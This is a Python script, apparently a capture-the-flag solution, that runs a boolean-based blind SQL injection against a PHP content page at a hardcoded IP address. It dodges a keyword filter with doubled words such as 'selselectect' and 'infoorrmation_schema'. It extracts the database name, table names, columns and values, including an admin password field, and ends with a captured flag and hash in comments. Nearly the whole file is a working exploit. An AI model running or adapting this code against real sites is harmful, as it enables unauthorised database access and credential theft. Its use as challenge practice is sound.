import requests

url = "http://58.240.236.231:27005/backend/content_detail.php?id="
chkmsg = "yesyesyes"
request_times = 0

# 检查布尔响应
def check_boolean(rep):
    return chkmsg in rep.text

# 检查响应
def check_response(test_url):
    global request_times
    print(test_url)
    rep = requests.get(test_url)
    request_times += 1
    return check_boolean(rep)

# 长度确认
def get_target_len(inLen):
    l, r, ans = 1, 100, 100
    while l <= r:
        mid = (l + r) >> 1
        payload = inLen.format(len = mid)
        if check_response(url + payload):
            ans, r = mid, mid - 1
        else:
            l = mid + 1
    return ans

def get_target(targetStr):
    global request_times
    request_times = 0
    inTargetLen = f"1 anandd length(({targetStr}))<=" + "{len}"
    inTarget = f"1 anandd ascii(substr(({targetStr})," + " {ind}, 1))<={val}"
    TargetLen = get_target_len(inTargetLen)
    print("* len: " + str(TargetLen))
    Target = ""
    for i in range(1, TargetLen + 1):
        l, r, ans = 30, 125, 30
        while l <= r:
            mid = (l + r) >> 1
            payload = inTarget.format(ind = i, val = mid)
            if check_response(url + payload):
                ans, r = mid, mid - 1
            else:
                l = mid + 1
        Target += chr(ans)
    print("* Scan finished! Requests number: %d" % request_times)
    return Target

def get_database():
    targetStr = "database()"
    DBname = get_target(targetStr)
    print("* Database: " + DBname)
    return

def get_tables():
    DBname = input("++ Input database name: ")
    targetStr = f"selselectect group_concat(table_name) frfromom infoorrmation_schema.tables where table_schema='{DBname}'"
    Tables = get_target(targetStr)
    print("* Tables: " + Tables)
    return

def get_columns():
    Tablename = input("++ Input table name: ")
    if Tablename == "admin":
        Tablename = "admadminin"
    targetStr = f"selselectect group_concat(column_name) frfromom infoorrmation_schema.columns where table_name='{Tablename}'"
    Columns = get_target(targetStr)
    print("* Columns: " + Columns)
    return

def get_values():
    Tablename = input("++ Input table name: ")
    Colname = input("++ Input column name: ")
    if Tablename == "admin":
        Tablename = "admadminin"
    if Colname == "password":
        Colname = "passpasspasswoorrdwoorrdwoorrd"
    targetStr = f"selselectect group_concat({Colname}) frfromom {Tablename}"
    Value = get_target(targetStr)
    print("* Value: " + Value)
    return 

if __name__ == "__main__":
    while 1:
        print("[*] Target url: " + url)
        print("[*] Options:")
        print("[*] 1: Scan Database")
        print("[*] 2: Scan Tables")
        print("[*] 3: Scan Columns")
        print("[*] 4: Scan Values")
        u = input("+ Input option [1/2/3/4]: ")
        if u == "1": get_database()
        elif u == "2": get_tables()
        elif u == "3": get_columns()
        elif u == "4": get_values()
        else: break
    print("Bye")
    
# flag{43fe2a21-da3d-4acd-a10b-2c76cbe0a1b5}
# 4e63f52598e1fa88eba07305f25499be